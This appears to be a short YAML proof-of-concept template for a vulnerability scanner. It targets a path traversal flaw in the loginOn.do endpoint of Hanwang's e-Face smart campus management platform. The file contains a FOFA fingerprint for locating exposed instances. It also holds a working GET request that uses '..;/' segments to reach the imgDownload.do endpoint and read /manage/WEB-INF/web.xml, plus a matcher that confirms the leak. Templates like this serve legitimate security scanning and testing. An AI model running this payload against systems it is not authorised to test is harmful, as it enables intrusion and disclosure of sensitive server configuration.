id: poc-yaml-hw-e-face-pass-spmp-loginon-do-path-traversal
info:
  name: 汉王e脸通智慧园区管理平台 loginOn.do 路径遍历漏洞
  severity: high
  tags:
  - 目录遍历
  finger: e脸通智慧园区管理平台
  fofa: icon_hash="1380907357"
requests:
- method: GET
  path: /manage/login/loginOn.do/..;/..;/resourceUpload/imgDownload.do?filePath=/manage/WEB-INF/web.xml
  expression: status_code == 200 && contains(body,"</web-app>") && contains(body,"<display-name>")
    && contains(body,"<listener>") && contains(content_type,"image")
variables: {}
transport: http
